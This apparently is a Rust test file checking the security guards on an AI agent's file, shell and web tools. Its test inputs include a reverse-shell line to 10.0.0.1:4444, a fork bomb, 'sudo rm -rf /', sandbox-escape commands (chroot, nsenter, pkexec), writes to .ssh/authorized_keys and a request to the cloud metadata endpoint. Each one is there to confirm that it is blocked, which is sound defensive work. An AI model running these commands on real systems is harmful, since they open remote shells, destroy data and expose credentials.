//! Tests for builtin tools (split from original tests.rs)

use super::*;

use super::tests::{setup, put};

    // ======================================================================
    // F-07 接线回归守卫：L2/L3 必须真的挂在生产路径上
    //
    // 这组测试的设计要点：**每条断言都只有在扫描器真正接线时才可能通过**。
    // 用例刻意挑选 L1（safe_resolve / CommandGuard）覆盖不到的输入：
    //   - 工作区内的 .ssh/.aws 写入：safe_resolve 认为合法（确实没逃出工作区）
    //   - chroot/unshare/nsenter：CommandGuard 的正则表里根本没有这些词
    //   - eval / 反弹 shell 内容：命令护栏只看命令串，不看写入的文件内容
    // 因此一旦有人把 PREFLIGHT 调用从工具里摘掉，这些用例会立刻变红。
    // ======================================================================

    /// L3 正向：工作区**内**的凭证目录写入必须被拒（L1 放行，只有 L3 能拦）。
    #[tokio::test]
    async fn guard_denies_credential_dir_write_inside_workspace() {
        let (reg, dir) = setup();
        for path in [
            ".ssh/authorized_keys",
            ".aws/credentials",
            ".gnupg/secring.gpg",
        ] {
            let mut a = HashMap::new();
            put(&mut a, "path", path);
            put(&mut a, "content", "x\n");
            let r = reg.execute_local_tool("write_file", &a).await.unwrap();
            assert!(
                r.is_error(),
                "写入凭证目录必须被 L3 拒绝（L1 会放行）: {path}"
            );
            assert!(
                !dir.join(path).exists(),
                "被拒的写入不得产生任何落盘副作用: {path}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：make_dir 也不能凭空造出凭证目录。
    #[tokio::test]
    async fn guard_denies_credential_dir_creation() {
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "path", ".ssh");
        let r = reg.execute_local_tool("make_dir", &a).await.unwrap();
        assert!(r.is_error(), "make_dir 创建 .ssh 必须被 L3 拒绝");
        assert!(!dir.join(".ssh").exists(), "不得实际创建目录");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：.git 元数据写入判定为需审批 → 自动化路径 fail-closed 拒绝。
    #[tokio::test]
    async fn guard_denies_git_metadata_write_without_approval() {
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "path", ".git/config");
        put(&mut a, "content", "[core]\n");
        let r = reg.execute_local_tool("write_file", &a).await.unwrap();
        match r {
            ToolResult::Error { code, .. } => assert_eq!(
                code, "APPROVAL_REQUIRED",
                "需审批的操作应使用独立错误码，便于将来接交互审批"
            ),
            other => panic!("写 .git 应被拦，实际: {other:?}"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：删除与移动路径同样受护栏约束。
    #[tokio::test]
    async fn guard_denies_delete_and_move_into_credential_dir() {
        let (reg, dir) = setup();
        // 预置一个 .ssh 目录内文件（绕过工具直接落盘，模拟历史遗留）
        std::fs::create_dir_all(dir.join(".ssh")).unwrap();
        std::fs::write(dir.join(".ssh/id_rsa"), "KEY").unwrap();

        let mut d = HashMap::new();
        put(&mut d, "path", ".ssh/id_rsa");
        let r = reg.execute_local_tool("delete_file", &d).await.unwrap();
        assert!(r.is_error(), "删除凭证目录内文件必须被 L3 拒绝");
        assert!(dir.join(".ssh/id_rsa").exists(), "文件不得被删除");

        let mut m = HashMap::new();
        put(&mut m, "src", "hello.txt");
        put(&mut m, "dst", ".ssh/leaked.txt");
        let r = reg.execute_local_tool("move_file", &m).await.unwrap();
        assert!(r.is_error(), "把文件移入凭证目录必须被 L3 拒绝");
        assert!(dir.join("hello.txt").exists(), "源文件不得被移走");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：沙箱逃逸命令（CommandGuard 不认识，只有 L3 能拦）。
    #[tokio::test]
    async fn guard_denies_sandbox_escape_exec() {
        let (reg, dir) = setup();
        for bad in [
            "chroot /mnt /bin/sh",
            "unshare -r /bin/bash",
            "nsenter -t 1 -m -u sh",
            "pkexec /bin/sh",
        ] {
            // 前置证明：L1 CommandGuard 确实拦不住，排除"其实是 L1 拦的"这种假阳性
            assert!(
                crate::security::CommandGuard::new().check(bad).is_ok(),
                "前提失效：CommandGuard 现在能拦 {bad} 了，本用例需重新挑选样本"
            );
            let mut s = HashMap::new();
            put(&mut s, "command", bad);
            let r = reg.execute_local_tool("shell_exec", &s).await.unwrap();
            assert!(r.is_error(), "沙箱逃逸命令必须被 L3 拒绝: {bad}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L2 正向：恶意内容落盘必须被拦（命令护栏看不到文件内容）。
    #[tokio::test]
    async fn guard_denies_malicious_content_write() {
        let (reg, dir) = setup();
        for (name, content) in [
            ("evil.py", "def run(c):\n    return eval(c)\n"),
            ("rev.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
            ("bomb.sh", ":(){ :|:& };:\n"),
        ] {
            let mut a = HashMap::new();
            put(&mut a, "path", name);
            put(&mut a, "content", content);
            let r = reg.execute_local_tool("write_file", &a).await.unwrap();
            match r {
                ToolResult::Error { code, message } => {
                    assert_eq!(code, "MALWARE_BLOCKED", "应由 L2 拦下: {name}");
                    // 审计信息只带规则 ID，不回显命中原文
                    assert!(message.contains("L2-"), "应标注命中规则: {message}");
                }
                other => panic!("恶意内容 {name} 应被拦，实际: {other:?}"),
            }
            assert!(!dir.join(name).exists(), "被拒内容不得落盘: {name}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L2 正向：append / edit 这两条"增量写"路径同样受扫描（防绕过）。
    #[tokio::test]
    async fn guard_denies_malicious_content_via_append_and_edit() {
        let (reg, dir) = setup();
        let mut ap = HashMap::new();
        put(&mut ap, "path", "hello.txt");
        put(&mut ap, "content", "\nresult = eval(payload)\n");
        let r = reg.execute_local_tool("append_file", &ap).await.unwrap();
        assert!(r.is_error(), "append 注入 eval 必须被 L2 拦");

        let mut ed = HashMap::new();
        put(&mut ed, "path", "hello.txt");
        put(&mut ed, "old_string", "line1");
        put(&mut ed, "new_string", "line1\nos.system(cmd)\nx = eval(y)");
        let r = reg.execute_local_tool("edit_file", &ed).await.unwrap();
        assert!(r.is_error(), "edit 注入 eval 必须被 L2 拦");

        let after = std::fs::read_to_string(dir.join("hello.txt")).unwrap();
        assert!(!after.contains("eval"), "被拒的编辑不得写入文件: {after}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 负向（防误杀）：工作区内普通写入 + 良性代码必须全部放行。
    /// 护栏过严会把 Agent 变砖，这条与正向用例同等重要。
    #[tokio::test]
    async fn guard_allows_benign_writes_and_commands() {
        let (reg, dir) = setup();
        let benign: [(&str, &str); 4] = [
            ("src/main.rs", "fn main() { println!(\"hello\"); }\n"),
            ("docs/readme.md", "# Title\n\n普通文档内容。\n"),
            ("a/b/c/deep.txt", "nested write\n"),
            ("cfg.json", "{\"retries\": 3, \"timeout\": 30}\n"),
        ];
        for (path, content) in benign {
            let mut a = HashMap::new();
            put(&mut a, "path", path);
            put(&mut a, "content", content);
            let r = reg.execute_local_tool("write_file", &a).await.unwrap();
            assert!(!r.is_error(), "良性写入被误杀: {path} -> {r:?}");
            assert!(dir.join(path).exists(), "文件应已落盘: {path}");
        }

        // 良性命令不得误杀（尤其含 mount/amount 等子串的命令）
        for cmd in ["echo ok", "git status", "echo mountain-view"] {
            let mut s = HashMap::new();
            put(&mut s, "command", cmd);
            let r = reg.execute_local_tool("shell_exec", &s).await.unwrap();
            assert!(!r.is_error(), "良性命令被误杀: {cmd} -> {r:?}");
        }

        // 正常的删除 / 建目录 / 移动同样应放行
        let mut mk = HashMap::new();
        put(&mut mk, "path", "newdir/sub");
        assert!(!reg
            .execute_local_tool("make_dir", &mk)
            .await
            .unwrap()
            .is_error());
        let mut mv = HashMap::new();
        put(&mut mv, "src", "cfg.json");
        put(&mut mv, "dst", "conf/cfg.json");
        assert!(!reg
            .execute_local_tool("move_file", &mv)
            .await
            .unwrap()
            .is_error());
        let mut rm = HashMap::new();
        put(&mut rm, "path", "docs/readme.md");
        assert!(!reg
            .execute_local_tool("delete_file", &rm)
            .await
            .unwrap()
            .is_error());

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 读取边界：工作区**内**的凭证文件不得进模型上下文。
    ///
    /// 前提是最要命的那种：未绑定项目时工作区根就是数据目录 `~/.marguerite`，
    /// `.env` / `gateway-token` 与源码同级 —— L1（safe_resolve）认为完全合法，
    /// 只有 L3 的**文件名**判定能拦。grep / codebase_search 泄露的是同一份密钥
    /// （命中的原文行），所以它们也必须过滤。
    #[tokio::test]
    async fn guard_denies_credential_file_reads_and_searches() {
        const SECRET: &str = "sk-SECRET-VALUE-9f3a";
        let (reg, dir) = setup();
        let creds: [(&str, String); 5] = [
            (".env", format!("MARGUERITE_API_KEY={SECRET}\n")),
            ("gateway-token", format!("{SECRET}\n")),
            ("credentials.json", format!("{{\"k\":\"{SECRET}\"}}\n")),
            ("vault.json", format!("{{\"k\":\"{SECRET}\"}}\n")),
            ("model.key", format!("{SECRET}\n")),
        ];
        for (name, body) in &creds {
            std::fs::write(dir.join(name), body).unwrap();
        }

        // read_file：逐文件被拒，且拒绝结果里也不得回显密钥
        for (name, _) in &creds {
            let mut a = HashMap::new();
            put(&mut a, "path", name);
            let r = reg.execute_local_tool("read_file", &a).await.unwrap();
            assert!(r.is_error(), "读取凭证文件必须被拒: {name}");
            assert!(
                !format!("{r:?}").contains(SECRET),
                "拒绝信息不得回显密钥原文: {name}"
            );
        }

        // grep / codebase_search：命中行同样不得带出（gateway-token 非隐藏文件，
        // 未被 walk_files 的目录黑名单排除，只有凭证过滤能挡住它）
        for (tool, key) in [("grep", "pattern"), ("codebase_search", "query")] {
            let mut a = HashMap::new();
            put(&mut a, key, SECRET);
            let r = reg.execute_local_tool(tool, &a).await.unwrap();
            assert!(
                !format!("{r:?}").contains(SECRET),
                "{tool} 不得把凭证文件内容带进结果"
            );
        }

        // 防误杀：模板文件不含密钥，脚手架场景必须可读
        std::fs::write(dir.join(".env.example"), "MARGUERITE_API_KEY=\n").unwrap();
        let mut a = HashMap::new();
        put(&mut a, "path", ".env.example");
        let r = reg.execute_local_tool("read_file", &a).await.unwrap();
        assert!(!r.is_error(), "`.env.example` 必须可读: {r:?}");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn shell_exec_runs_and_is_guarded() {
        let (reg, dir) = setup();
        let mut s = HashMap::new();
        put(&mut s, "command", "echo from_shell");
        let r = reg.execute_local_tool("shell_exec", &s).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => assert!(data.contains("from_shell")),
            _ => panic!("shell_exec failed"),
        }

        // 高危命令应被拦截
        let mut bad = HashMap::new();
        put(&mut bad, "command", "sudo rm -rf /");
        let r = reg.execute_local_tool("shell_exec", &bad).await.unwrap();
        assert!(r.is_error(), "dangerous command must be blocked");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn web_fetch_blocked_for_private() {
        let (reg, dir) = setup();
        let mut w = HashMap::new();
        put(&mut w, "url", "http://169.254.169.254/latest/meta-data/");
        let r = reg.execute_local_tool("web_fetch", &w).await.unwrap();
        assert!(r.is_error(), "SSRF to metadata must be blocked");
        let _ = std::fs::remove_dir_all(&dir);
    }
